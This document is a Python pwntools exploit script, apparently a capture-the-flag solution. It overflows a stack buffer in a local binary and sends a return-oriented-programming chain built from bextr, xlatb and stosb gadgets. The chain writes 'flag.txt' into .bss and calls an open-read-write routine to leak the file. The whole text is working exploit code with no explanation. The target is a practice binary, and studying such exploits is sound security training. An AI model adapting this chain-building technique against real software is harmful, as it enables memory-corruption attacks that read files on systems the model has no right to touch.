#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./pwn_patched')
libc = ELF('./libc-2.31.so')
ld = ELF('./ld-2.31.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 1
if local:
    p = process([elf.path])
else:
    p = remote('localhost', 8888)

bss_buf = 0x404050
# 0x0000000000401111 : pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret
bextr_ret = 0x0000000000401111
# 0x00000000004010a5 : xlatb ; ret
xlatb_ret = 0x00000000004010a5
# 0x00000000004010d1 : stosb byte ptr [rdi], al ; ret
stosb_ret = 0x00000000004010d1
call_orw = 0x0000000000401165
pop_rdi_ret = 0x00000000004011f3

def set_rbx_to_addr(target_addr):
    payload = ''
    rdx = (0x40 << 8) | 0x0 # rcx: len 0x40 | len 0x0
    rcx = target_addr
    payload += up64(bextr_ret)
    payload += up64(rdx)
    payload += up64(rcx - 0x3ef2) # add rcx, 0x3ef2
    return payload

def set_al_to_byte(target, real_time_al):
    target_byte_addr = next(elf.search(target.encode(ENCODING)))
    target_rbx = target_byte_addr - real_time_al
    payload = set_rbx_to_addr(target_rbx)
    payload += up64(xlatb_ret) # xlatb ; --> al = [rbx+al]
    return payload

target = '\x0b' + 'flag.txt'
payload = ''
payload += up64(pop_rdi_ret) + up64(bss_buf)
for i in range(len(target) - 1):
    payload += set_al_to_byte(target[i + 1], ord(target[i])) + up64(stosb_ret)
payload += up64(pop_rdi_ret) + up64(bss_buf) + up64(call_orw)
assert len(payload) <= 0x200 - 0x32
gdb.attach(p)
sa('> ', 'A' * 0x20 + 'B' * 8 + payload)

p.interactive()

